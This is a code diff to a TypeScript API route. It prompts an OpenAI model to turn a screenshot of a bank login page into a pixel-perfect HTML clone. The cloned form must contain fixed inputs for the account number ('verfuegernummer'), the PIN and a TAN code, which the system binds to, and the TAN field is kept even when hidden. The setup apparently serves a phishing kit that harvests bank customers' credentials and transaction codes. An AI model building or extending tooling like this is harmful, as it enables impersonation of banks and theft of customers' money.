@@ -21,58 +21,35 @@ export async function POST(req: Request) {
     }
 
     const prompt = `
-You are an expert UI/UX developer and CSS architect. Analyze the provided bank login page image and extract its design properties into a strictly formatted JSON object.
-DO NOT wrap the response in markdown blocks (like \`\`\`json). Return ONLY the raw JSON object.
+You are an expert frontend developer and CSS architect. Analyze the provided bank login page image.
+Instead of returning a rigid JSON config, you must write a complete, pixel-perfect HTML template using Tailwind CSS utility classes and inline styles to perfectly clone the reference image.
+We will use this HTML to render a dynamic React component.
 
-The JSON MUST match this exact schema:
+Requirements for the HTML:
+1. The wrapper should be a <div> that represents the entire viewport (e.g. min-h-screen).
+2. It MUST contain a <form> element.
+3. Inside the form, you MUST include the following exact input tags so our React system can bind to them:
+   - <input name="verfuegernummer" /> (for the username, account number, or client number)
+   - <input name="pin" type="password" /> (for the password or PIN)
+   - <input name="tacCode" /> (if there is a 3rd input in the image. If not, include it anyway but add style="display:none;" so our system can still bind it).
+   - <button type="submit">The button text</button>
+4. Extract the exact text, colors (using hex codes in Tailwind classes like bg-[#0051a5] or inline styles), border-radiuses, spacing, layout (e.g., split screen, centered box, full width header), and typography you see in the image.
+5. If there is a logo, use a placeholder <img> tag or just a stylized <div> with the bank's name. Our system will dynamically inject the logo later if needed.
+6. Do NOT include <html>, <head>, or <body> tags. Start directly with the main container <div>.
+7. DO NOT use any markdown formatting (like \`\`\`json). Return ONLY the raw JSON object.
+
+The JSON MUST match this exact schema (we will mostly rely on customHtml, but fill the others with dummy/default data to satisfy TypeScript):
 {
-  "layout": "centered" | "split-left" | "split-right" | "full-width",
-  "blocks": ["header", "spacer", "form", "spacer", "footer"], // order them as they appear vertically
-  "background": {
-    "type": "color" | "image",
-    "value": "string (HEX color or 'image' if it's a photo)"
-  },
-  "header": {
-    "show": boolean,
-    "backgroundColor": "string (HEX)",
-    "height": "string (e.g., '80px')",
-    "logoAlignment": "left" | "center" | "right",
-    "padding": "string"
-  },
-  "formBox": {
-    "backgroundColor": "string (HEX)",
-    "textColor": "string (HEX)",
-    "borderRadius": "string (e.g., '8px')",
-    "boxShadow": "none" | "sm" | "md" | "lg",
-    "padding": "string (e.g., '2rem')",
-    "width": "string (e.g., '400px')",
-    "alignment": "left" | "center" | "right"
-  },
-  "button": {
-    "backgroundColor": "string (HEX)",
-    "hoverColor": "string (HEX)",
-    "textColor": "string (HEX)",
-    "borderRadius": "string (e.g., '4px')",
-    "padding": "string",
-    "fontWeight": "string"
-  },
-  "typography": {
-    "fontFamily": "string",
-    "headerColor": "string (HEX)",
-    "bodyColor": "string (HEX)",
-    "linkColor": "string (HEX)"
-  },
-  "texts": {
-    "title": "string (The main login header)",
-    "subtitle": "string (The secondary text below the header)",
-    "footerLinks": ["string"]
-  }
+  "customHtml": "your_raw_html_string_here (MAKE IT MINIFIED OR SINGLE LINE TO AVOID JSON ESCAPING ISSUES IF POSSIBLE, ESCAPE QUOTES PROPERLY)",
+  "layout": "centered",
+  "blocks": ["form"],
+  "background": { "type": "color", "value": "#ffffff" },
+  "header": { "show": false, "backgroundColor": "#fff", "height": "0", "logoAlignment": "center", "padding": "0" },
+  "formBox": { "backgroundColor": "#fff", "textColor": "#000", "borderRadius": "0", "boxShadow": "none", "padding": "0", "width": "100%", "alignment": "center" },
+  "button": { "backgroundColor": "#000", "hoverColor": "#000", "textColor": "#fff", "borderRadius": "0", "padding": "0", "fontWeight": "normal" },
+  "typography": { "fontFamily": "sans-serif", "headerColor": "#000", "bodyColor": "#000", "linkColor": "#000" },
+  "texts": { "title": "Login", "subtitle": "", "footerLinks": [] }
 }
-
-Analyze the image carefully:
-- If the form is on the right side and an image is on the left, layout is "split-right".
-- Extract exact HEX colors for buttons, backgrounds, and text.
-- Extract the actual Dutch text you see for title and subtitle.
     `;
 
     const response = await openai.chat.completions.create({
@@ -91,7 +68,7 @@ Analyze the image carefully:
           ],
         },
       ],
-      max_tokens: 1000,
+      max_tokens: 2500,
     });
 
     const aiText = response.choices[0].message.content || "";
